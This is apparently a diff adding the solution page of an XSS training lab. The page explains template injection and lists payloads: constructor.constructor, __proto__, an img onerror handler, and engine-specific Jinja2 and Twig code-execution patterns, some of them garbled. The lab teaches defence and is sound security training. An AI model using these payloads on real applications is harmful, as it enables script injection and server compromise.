@@ -1,0 +1,176 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 15 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 15 Solution: XSS via Template Injection</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how template injection vulnerabilities can lead to XSS. The application uses a template engine that processes user input without proper sanitization, allowing an attacker to inject template syntax that executes JavaScript.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to exploit the template injection vulnerability by injecting template syntax that will execute JavaScript.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Template injection occurs when user input is embedded in a template that is then processed by a template engine. In this challenge:</p>
+                        <ol>
+                            <li>The application allows users to create email templates with variables like <code>{{ "{{ name }}" }}</code>.</li>
+                            <li>The template engine processes these variables and replaces them with actual values.</li>
+                            <li>The template engine also supports expressions and functions, which can be exploited.</li>
+                            <li>If the template engine doesn't properly sanitize input, attackers can inject malicious template syntax.</li>
+                            <li>This can lead to XSS if the template engine allows access to JavaScript functions or objects.</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Identifying the Template Engine</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>The first step is to identify what template engine is being used and what syntax it supports. From the challenge description, we know that the template engine uses double curly braces <code>{{ "{{ }}" }}</code> for variables and supports basic expressions and functions.</p>
+                        <p>Common template engines with this syntax include:</p>
+                        <ul>
+                            <li>Handlebars</li>
+                            <li>Mustache</li>
+                            <li>Jinja2</li>
+                            <li>Twig</li>
+                            <li>Liquid</li>
+                        </ul>
+                        <p>Each template engine has its own set of features and security measures, but most allow some form of expression evaluation that can be exploited.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Crafting the Payload</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To exploit the template injection vulnerability, we need to craft a payload that uses template syntax to execute JavaScript. Here are several approaches:</p>
+                        
+                        <h6>Method 1: Using Expression Evaluation</h6>
+                        <pre class="bg-light p-3 rounded"><code>{{ "{{ constructor.constructor('alert(\"XSS Level 15 Completed!\")')() }}" }}</code></pre>
+                        <p>This payload uses the constructor property to access the Function constructor, which can be used to create and execute arbitrary JavaScript.</p>
+                        
+                        <h6>Method 2: Using HTML Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>{{ "{{ '<img src=x onerror=\"alert(\\'XSS Level 15 Completed!\\')\">' }}" }}</code></pre>
+                        <p>This payload injects an HTML img tag with an onerror event handler that executes JavaScript.</p>
+                        
+                        <h6>Method 3: Using Template Helpers or Filters</h6>
+                        <pre class="bg-light p-3 rounded"><code>{{ "{{ eval('alert(\"XSS Level 15 Completed!\")') }}" }}</code></pre>
+                        <p>Some template engines provide helper functions like eval that can be used to execute arbitrary code.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step-by-Step Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>
+                                <p>Enter a name for your template (e.g., "Malicious Template").</p>
+                            </li>
+                            <li>
+                                <p>Enter a subject for your email (e.g., "Important Update").</p>
+                            </li>
+                            <li>
+                                <p>In the Template Content field, include one of the template injection payloads:</p>
+                                <pre class="bg-light p-3 rounded"><code>Hello {{ "{{ name }}" }},
+
+Thank you for your interest in {{ "{{ company }}" }}.
+
+{{ "{{ constructor.constructor('alert(\"XSS Level 15 Completed!\")')() }}" }}
+
+Best regards,
+The {{ "{{ company }}" }} Team
+
+---
+Date: {{ "{{ date }}" }}
+To unsubscribe, click here: {{ "{{ unsubscribe }}" }}</code></pre>
+                            </li>
+                            <li>
+                                <p>Click "Save Template" to submit the form.</p>
+                            </li>
+                            <li>
+                                <p>When the template is processed, the template engine will evaluate the expression, executing our JavaScript.</p>
+                            </li>
+                            <li>
+                                <p>The alert will show "XSS Level 15 Completed!", and the challenge will be solved.</p>
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Alternative Approaches</h5>
+                    </div>
+                    <div class="card-body">
+                        <h6>1. Using Object Properties</h6>
+                        <p>Accessing global objects through the template context:</p>
+                        <pre class="bg-light p-3 rounded"><code>{{ "{{ this.constructor.constructor('alert(\"XSS Level 15 Completed!\")')() }}" }}</code></pre>
+                        
+                        <h6>2. Using Template Context</h6>
+                        <p>Accessing the template context to find objects with access to JavaScript:</p>
+                        <pre class="bg-light p-3 rounded"><code>{{ "{{ __proto__.constructor.constructor('alert(\"XSS Level 15 Completed!\")')() }}" }}</code></pre>
+                        
+                        <h6>3. Using Template-Specific Features</h6>
+                        <p>Different template engines have different features that can be exploited:</p>
+                        <ul>
+                            <li>Handlebars: <code>{{ "{{#with (constructor.constructor 'alert(\"XSS Level 15 Completed!\")')()} }}" }}</code></li>
+                            <li>Jinja2: <code>{{ "{{ ''.__class__.__mro__[1].__subclasses__()[40]('alert(\"XSS Level 15 Completed!\")', shell=True) }}" }}</code></li>
+                            <li>Twig: <code>{{ "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('alert(\"XSS Level 15 Completed!\")') }}" }}</code></li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>Server-Side Template Injection (SSTI):</strong> The ability to inject template syntax that is executed by the template engine.</li>
+                            <li><strong>Client-Side Template Injection (CSTI):</strong> Similar to SSTI but executed in the browser.</li>
+                            <li><strong>Context Escaping:</strong> Breaking out of the intended template context to execute arbitrary code.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Input Validation:</strong> Validate and sanitize all user input before processing it with a template engine.</li>
+                            <li><strong>Template Sandboxing:</strong> Use template engines that support sandboxing to limit what can be accessed and executed.</li>
+                            <li><strong>Least Privilege:</strong> Use template engines with minimal features and disable unnecessary functionality.</li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to mitigate the impact of XSS.</li>
+                            <li><strong>Output Encoding:</strong> Ensure that all output is properly encoded for the context it's being used in.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            Template injection vulnerabilities have been found in many popular web applications and frameworks. These vulnerabilities can lead to various attacks, including XSS, server-side code execution, and remote code execution. In real-world scenarios, template injection can be particularly dangerous because it often allows access to internal objects and methods, potentially leading to full server compromise.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level15') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
